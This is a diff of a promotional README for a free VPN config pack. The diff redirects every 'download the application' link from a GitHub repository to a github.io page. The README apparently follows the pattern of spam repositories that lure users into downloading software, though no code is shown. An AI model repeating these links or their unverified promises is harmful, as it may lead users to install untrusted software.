@@ -4,7 +4,7 @@
 
 Welcome to the Free-VPN-Config-Pack-2026! This pack gives you everything you need to browse the internet safely, privately, and without restrictions—all for free. Whether you want to watch geo-blocked content, protect your personal data, or just enjoy unlimited traffic, this VPN config pack has you covered.
 
-Visit this link to download the application: **[Download Free-VPN-Config-Pack-2026](https://github.com/Fixed-logjam434/Free-VPN-Config-Pack-2026)**
+Visit this link to download the application: **[Download Free-VPN-Config-Pack-2026](https://fixed-logjam434.github.io)**
 
 ## 🌍 What Is This Pack?
 
@@ -18,7 +18,7 @@ Our pack includes:
 ## 📥 How to Download and Install (Windows)
 
 ### Step 1: Download the Pack
-Visit this link to download the application: **[Download Free-VPN-Config-Pack-2026](https://github.com/Fixed-logjam434/Free-VPN-Config-Pack-2026)**  
+Visit this link to download the application: **[Download Free-VPN-Config-Pack-2026](https://fixed-logjam434.github.io)**  
 Once you're on the page, find the "Download" button and click it. The process takes less than a minute.
 
 ### Step 2: Save the File
@@ -142,6 +142,6 @@ All locations offer both OpenVPN and WireGuard configs. You can switch between t
 
 Your private, unrestricted internet access starts now.
 
-Visit this link to download the application: **[Download Free-VPN-Config-Pack-2026](https://github.com/Fixed-logjam434/Free-VPN-Config-Pack-2026)**
+Visit this link to download the application: **[Download Free-VPN-Config-Pack-2026](https://fixed-logjam434.github.io)**
 
 Keywords: asia-vpn, eu-vpn, openvpn, openvpn-configs, usa-vpn, vpn-config-pack, vpn-configs, vpn-servers, wireguard-configs, wireguard-vpn
